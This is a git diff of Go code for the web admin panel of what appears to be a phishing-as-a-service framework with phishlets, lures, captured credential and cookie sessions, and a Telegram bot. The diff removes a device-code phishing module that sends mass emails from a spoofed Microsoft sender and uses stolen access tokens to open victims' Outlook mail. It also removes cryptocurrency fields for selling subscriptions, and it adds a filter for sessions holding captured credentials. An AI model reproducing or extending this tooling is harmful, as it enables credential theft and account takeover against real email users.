@@ -6,7 +6,6 @@ import (
 	"html/template"
 	"net/http"
 	"net/url"
-	"os"
 	"strconv"
 	"strings"
 	"time"
@@ -383,28 +382,11 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 			token := strings.TrimSpace(r.FormValue("bot_token"))
 			adminIdStr := strings.TrimSpace(r.FormValue("bot_admin_chat_id"))
 			adminId, _ := strconv.ParseInt(adminIdStr, 10, 64)
-			btc := strings.TrimSpace(r.FormValue("crypto_btc"))
-			eth := strings.TrimSpace(r.FormValue("crypto_eth"))
-			usdt := strings.TrimSpace(r.FormValue("crypto_usdt"))
-			priceStr := strings.TrimSpace(r.FormValue("sub_price"))
-			price, _ := strconv.Atoi(priceStr)
 			if token != "" {
 				s.Cfg.SetBotToken(token)
 			}
 			if adminId != 0 {
 				s.Cfg.SetBotAdminChatId(adminId)
-			}
-			if btc != "" {
-				s.Cfg.SetCryptoBTC(btc)
-			}
-			if eth != "" {
-				s.Cfg.SetCryptoETH(eth)
-			}
-			if usdt != "" {
-				s.Cfg.SetCryptoUSDT(usdt)
-			}
-			if price > 0 {
-				s.Cfg.SetSubPrice(price)
 			}
 			http.Redirect(w, r, "/admin/panel?tab=telegram&ok=bot+config+saved+(restart+to+apply+token+change)", http.StatusSeeOther)
 			return
@@ -519,7 +501,6 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 		{"phishlets", "Phishlets"},
 		{"lures", "Lures &amp; Chains"},
 		{"sessions", "Sessions"},
-		{"devicecodes", "Device Codes"},
 		{"blacklist", "Blacklist"},
 		{"telegram", pendingLabel},
 	}
@@ -854,251 +835,6 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 		}
 		b.WriteString(`</div>`)
 
-	// ── DEVICE CODES ──────────────────────────────────────────────────────────
-	case "devicecodes":
-		if r.Method == "POST" {
-			action := r.FormValue("action")
-			switch action {
-			case "save_smtp":
-				host := strings.TrimSpace(r.FormValue("smtp_host"))
-				portStr := strings.TrimSpace(r.FormValue("smtp_port"))
-				user := strings.TrimSpace(r.FormValue("smtp_user"))
-				pass := r.FormValue("smtp_pass")
-				from := strings.TrimSpace(r.FormValue("smtp_from"))
-				port, _ := strconv.Atoi(portStr)
-				s.Cfg.SetSmtp(host, port, user, pass, from)
-				http.Redirect(w, r, "/admin/panel?tab=devicecodes&ok=smtp+saved", http.StatusSeeOther)
-				return
-			case "launch_campaign":
-				name := strings.TrimSpace(r.FormValue("camp_name"))
-				tmpl := r.FormValue("camp_template")
-				emailsRaw := r.FormValue("camp_emails")
-				var emails []string
-				for _, line := range strings.Split(emailsRaw, "\n") {
-					e := strings.TrimSpace(line)
-					if e != "" {
-						emails = append(emails, e)
-					}
-				}
-				if len(emails) == 0 {
-					http.Redirect(w, r, "/admin/panel?tab=devicecodes&err=no+emails", http.StatusSeeOther)
-					return
-				}
-				camp, _ := LaunchCampaign(name, tmpl, emails)
-				http.Redirect(w, r, fmt.Sprintf("/admin/panel?tab=devicecodes&ok=campaign+%d+launched+(%d+targets)", camp.ID, len(camp.Targets)), http.StatusSeeOther)
-				return
-
-			case "start_dc_single":
-				email := strings.TrimSpace(r.FormValue("dc_single_email"))
-				if email == "" || !strings.Contains(email, "@") {
-					http.Redirect(w, r, "/admin/panel?tab=devicecodes&err=invalid+email", http.StatusSeeOther)
-					return
-				}
-				tgt, err := StartDeviceCode(email)
-				if err != nil {
-					http.Redirect(w, r, "/admin/panel?tab=devicecodes&err="+url.QueryEscape(err.Error()), http.StatusSeeOther)
-					return
-				}
-				http.Redirect(w, r, "/admin/panel?tab=devicecodes&ok=dc+started+for+"+url.QueryEscape(email)+"&preview="+tgt.LandingToken, http.StatusSeeOther)
-				return
-
-			case "save_letter":
-				letterHTML := r.FormValue("letter_html")
-				subjectTxt := r.FormValue("subject_txt")
-				if letterHTML != "" {
-					os.WriteFile("letter.html", []byte(letterHTML), 0644)
-				}
-				if subjectTxt != "" {
-					os.WriteFile("subject.txt", []byte(strings.TrimSpace(subjectTxt)), 0644)
-				}
-				http.Redirect(w, r, "/admin/panel?tab=devicecodes&ok=letter+saved", http.StatusSeeOther)
-				return
-			}
-		}
-
-		baseURL := "http://" + s.Cfg.GetServerExternalIP()
-
-		// SMTP config
-		b.WriteString(`<div class="section">`)
-		b.WriteString(sectionHd("SMTP Configuration"))
-		b.WriteString(fmt.Sprintf(`<div class="card"><form method="POST" action="/admin/panel?tab=devicecodes">
-<input type="hidden" name="action" value="save_smtp">
-<div class="form-grid">
-  <div class="field"><label class="field-label">SMTP Host</label><input type="text" name="smtp_host" placeholder="smtp.gmail.com" value="%s"></div>
-  <div class="field"><label class="field-label">Port</label><input type="text" name="smtp_port" placeholder="587" value="%s"></div>
-  <div class="field"><label class="field-label">Username</label><input type="text" name="smtp_user" placeholder="user@gmail.com" value="%s"></div>
-  <div class="field"><label class="field-label">Password</label><input type="password" name="smtp_pass" placeholder="••••••••" value="%s"></div>
-  <div class="field field-full"><label class="field-label">From Name / Email</label><input type="text" name="smtp_from" placeholder="Microsoft Security &lt;no-reply@microsoft.com&gt;" value="%s"></div>
-</div>
-<button type="submit" class="btn btn-blue">Save SMTP</button>
-</form></div></div>`,
-			template.HTMLEscapeString(s.Cfg.GetSmtpHost()),
-			func() string {
-				p := s.Cfg.GetSmtpPort()
-				if p == 0 {
-					return "587"
-				}
-				return strconv.Itoa(p)
-			}(),
-			template.HTMLEscapeString(s.Cfg.GetSmtpUser()),
-			template.HTMLEscapeString(s.Cfg.GetSmtpPass()),
-			template.HTMLEscapeString(s.Cfg.GetSmtpFrom()),
-		))
-
-		// Start DC single
-		previewToken := r.URL.Query().Get("preview")
-		previewBanner := ""
-		if previewToken != "" {
-			phishLink := "http://" + s.Cfg.GetServerExternalIP() + "/dc/" + previewToken
-			previewBanner = fmt.Sprintf(`<div class="flash-ok" style="border-color:rgba(16,185,129,.3)">
-<strong>✓ DC Started</strong> — phish link ready<br>
-<div style="margin-top:8px;display:flex;flex-wrap:wrap;gap:8px;align-items:center">
-  <span class="mono" style="color:var(--t1)">%s</span>
-  <button onclick="cp(this)" data-copy="%s" class="btn btn-green btn-sm">📋 Copy Phish Link</button>
-  <a href="/dc/preview/%s" target="_blank" class="btn btn-ghost btn-sm">Preview Email →</a>
-</div></div>`,
-				template.HTMLEscapeString(phishLink),
-				template.HTMLEscapeString(phishLink),
-				template.HTMLEscapeString(previewToken))
-		}
-		b.WriteString(`<div class="section">`)
-		b.WriteString(sectionHd("Start DC — No Email (Test Mode)"))
-		b.WriteString(previewBanner)
-		b.WriteString(`<div class="card"><form method="POST" action="/admin/panel?tab=devicecodes">
-<input type="hidden" name="action" value="start_dc_single">
-<div class="form-row">
-  <input type="text" name="dc_single_email" placeholder="victim@company.com" style="max-width:320px">
-  <button type="submit" class="btn btn-primary btn-sm">Start DC</button>
-</div>
-<p style="color:var(--t3);font-size:11.5px;margin-top:8px">Starts the device code flow — no email sent. Use <strong style="color:var(--t2)">Preview Email</strong> to copy HTML and send manually.</p>
-</form></div></div>`)
-
-		// Letter editor
-		var existingLetter, existingSubject string
-		if raw, err := os.ReadFile("letter.html"); err == nil {
-			existingLetter = string(raw)
-		}
-		if raw, err := os.ReadFile("subject.txt"); err == nil {
-			existingSubject = strings.TrimSpace(string(raw))
-		}
-		b.WriteString(`<div class="section">`)
-		b.WriteString(sectionHd("Letter Editor"))
-		b.WriteString(`<div class="card">`)
-		b.WriteString(`<p style="color:var(--t3);font-size:11.5px;margin-bottom:14px">Tokens: <code style="color:var(--t2)">SILENTCODERSEMAIL</code> · <code style="color:var(--t2)">SILENTCODERSEMAILURL</code> · <code style="color:var(--t2)">DCLANDING</code> · <code style="color:var(--t2)">DCCODE</code> · <code style="color:var(--t2)">USER</code> · <code style="color:var(--t2)">DOMAIN</code> · <code style="color:var(--t2)">DOMC</code></p>`)
-		b.WriteString(fmt.Sprintf(`<form method="POST" action="/admin/panel?tab=devicecodes">
-<input type="hidden" name="action" value="save_letter">
-<div class="form-grid">
-  <div class="field field-full"><label class="field-label">Subject Line</label>
-    <input type="text" name="subject_txt" value="%s" placeholder="Microsoft Security Alert: Action Required">
-  </div>
-  <div class="field field-full"><label class="field-label">Email HTML (letter.html)</label>
-    <textarea name="letter_html" rows="14" style="font-family:monospace;font-size:11.5px;color:#7ec8e3" placeholder="Paste full HTML email — tokens replaced on send/preview">%s</textarea>
-  </div>
-</div>
-<button type="submit" class="btn btn-blue btn-sm">Save Letter</button>
-<span style="color:var(--t3);font-size:11.5px;margin-left:10px">Saved to letter.html + subject.txt. Takes effect immediately.</span>
-</form></div></div>`,
-			template.HTMLEscapeString(existingSubject),
-			template.HTMLEscapeString(existingLetter),
-		))
-
-		// Launch campaign
-		b.WriteString(`<div class="section">`)
-		b.WriteString(sectionHd("Launch Campaign"))
-		b.WriteString(`<div class="card"><form method="POST" action="/admin/panel?tab=devicecodes">
-<input type="hidden" name="action" value="launch_campaign">
-<div class="form-grid">
-  <div class="field"><label class="field-label">Campaign Name</label><input type="text" name="camp_name" placeholder="Q2 Targets"></div>
-  <div class="field"><label class="field-label">Template</label>
-    <select name="camp_template">
-      <option value="security_alert">Microsoft Security Alert</option>
-      <option value="it_helpdesk">IT Helpdesk</option>
-      <option value="custom">Custom (letter.html)</option>
-    </select>
-  </div>
-  <div class="field field-full"><label class="field-label">Email List (one per line)</label>
-    <textarea name="camp_emails" rows="6" placeholder="one@company.com&#10;two@company.com"></textarea>
-  </div>
-</div>
-<button type="submit" class="btn btn-green">🚀 Launch Campaign</button>
-<span style="color:var(--t3);font-size:11.5px;margin-left:10px">Each target gets a unique code. Emails sent via SMTP above.</span>
-</form></div></div>`)
-
-		// Active DC sessions
-		allTargets := GetDCTargets()
-		b.WriteString(`<div class="section">`)
-		b.WriteString(sectionHd(fmt.Sprintf("Active Sessions (%d)", len(allTargets))))
-		if len(allTargets) == 0 {
-			b.WriteString(`<div class="empty">No device code sessions yet.</div>`)
-		} else {
-			b.WriteString(`<div class="table-wrap"><table><thead><tr>
-<th>#</th><th>Email / Tenant</th><th>Code</th><th>Status</th>
-<th>Phish Link</th><th>Started</th><th>Actions</th></tr></thead><tbody>`)
-			for i := len(allTargets) - 1; i >= 0; i-- {
-				tgt := allTargets[i]
-				status := tgt.GetStatus()
-				badgeClass := "badge-amber"
-				switch status {
-				case "completed":
-					badgeClass = "badge-green"
-				case "expired", "declined", "error":
-					badgeClass = "badge-red"
-				}
-				label := tgt.Email
-				if label == "" {
-					label = tgt.Tenant
-				}
-				landingURL := baseURL + "/dc/" + tgt.LandingToken
-				landingCell := fmt.Sprintf(
-					`<div style="display:flex;flex-direction:column;gap:4px">
-<span class="mono url-cell">%s</span>
-<button class="btn btn-ghost btn-xs" style="align-self:flex-start" onclick="cp(this)" data-copy="%s">📋 Copy Link</button>
-</div>`,
-					template.HTMLEscapeString(landingURL),
-					template.HTMLEscapeString(landingURL),
-				)
-
-				tgt.mu.Lock()
-				at := tgt.AccessToken
-				tgt.mu.Unlock()
-				previewURL := "/dc/preview/" + tgt.LandingToken
-				tokenCell := fmt.Sprintf(
-					`<a href="%s" target="_blank" class="btn btn-ghost btn-xs">Preview Email</a>`,
-					template.HTMLEscapeString(previewURL))
-				if at != "" {
-					useURL := "/dc/use/" + tgt.LandingToken
-					openURL := "/dc/open/" + tgt.LandingToken
-					tokenCell = fmt.Sprintf(
-						`<div style="display:flex;gap:6px;flex-wrap:wrap">
-<a href="%s" target="_blank" class="btn btn-blue btn-xs">Dashboard</a>
-<a href="%s" target="_blank" class="btn btn-green btn-xs">⚡ OWA</a>
-</div>`,
-						template.HTMLEscapeString(useURL),
-						template.HTMLEscapeString(openURL))
-				}
-
-				b.WriteString(fmt.Sprintf(`<tr>
-<td class="mono" style="color:var(--t3)">%d</td>
-<td class="mono" style="color:var(--t1)">%s</td>
-<td><span class="mono" style="font-weight:700;font-size:14px;letter-spacing:3px;color:var(--amber)">%s</span></td>
-<td><span class="badge %s">%s</span></td>
-<td>%s</td>
-<td class="mono" style="color:var(--t3);font-size:11px">%s</td>
-<td>%s</td>
-</tr>`,
-					tgt.ID,
-					template.HTMLEscapeString(label),
-					template.HTMLEscapeString(tgt.UserCode),
-					badgeClass, status,
-					landingCell,
-					tgt.StartedAt.Format("Jan 2 15:04"),
-					tokenCell,
-				))
-			}
-			b.WriteString(`</tbody></table></div>`)
-		}
-		b.WriteString(`</div>`)
-
 	// ── TELEGRAM BOT ──────────────────────────────────────────────────────────
 	case "telegram":
 		b.WriteString(`<div class="section">`)
@@ -1108,20 +844,12 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 <div class="form-grid">
   <div class="field field-full"><label class="field-label">Bot Token (from @BotFather)</label><input type="text" name="bot_token" placeholder="1234567890:AABBCCddEEff..." value="%s"></div>
   <div class="field"><label class="field-label">Admin Chat ID</label><input type="text" name="bot_admin_chat_id" placeholder="your Telegram chat ID" value="%d"></div>
-  <div class="field"><label class="field-label">Price (USD/month)</label><input type="text" name="sub_price" placeholder="150" value="%d"></div>
-  <div class="field"><label class="field-label">BTC Address</label><input type="text" name="crypto_btc" placeholder="Bitcoin address" value="%s"></div>
-  <div class="field"><label class="field-label">ETH Address</label><input type="text" name="crypto_eth" placeholder="Ethereum address" value="%s"></div>
-  <div class="field"><label class="field-label">USDT Address (TRC20)</label><input type="text" name="crypto_usdt" placeholder="USDT address" value="%s"></div>
 </div>
 <button type="submit" class="btn btn-blue">Save Config</button>
 <span style="color:var(--t3);font-size:11.5px;margin-left:10px">Token change requires restart</span>
 </form></div></div>`,
 			template.HTMLEscapeString(s.Cfg.GetBotToken()),
 			s.Cfg.GetBotAdminChatId(),
-			s.Cfg.GetSubPrice(),
-			template.HTMLEscapeString(s.Cfg.GetCryptoBTC()),
-			template.HTMLEscapeString(s.Cfg.GetCryptoETH()),
-			template.HTMLEscapeString(s.Cfg.GetCryptoUSDT()),
 		))
 
 		b.WriteString(`<div class="section">`)
@@ -1214,7 +942,6 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 
 	nav := `<a href="/admin/panel?tab=overview" class="topbar-link">Overview</a>
 <a href="/admin/panel?tab=sessions" class="topbar-link">Sessions</a>
-<a href="/admin/panel?tab=devicecodes" class="topbar-link">Device Codes</a>
 <a href="/admin/panel?tab=lures" class="topbar-link">Lures</a>
 <a href="/admin/panel?tab=telegram" class="topbar-link">Telegram</a>`
 
@@ -1423,6 +1150,11 @@ func sessionTable(sessions []*database.Session, showDelete bool) string {
 	for _, sess := range sessions {
 		hasCreds := sess.Username != "" || sess.Password != ""
 		hasTokens := len(sess.CookieTokens) > 0 || len(sess.BodyTokens) > 0 || len(sess.HttpTokens) > 0
+
+		// Skip empty sessions (no credentials, no tokens)
+		if !hasCreds && !hasTokens {
+			continue
+		}
 
 		tokenBadge := `<span class="badge badge-gray">none</span>`
 		if hasTokens {
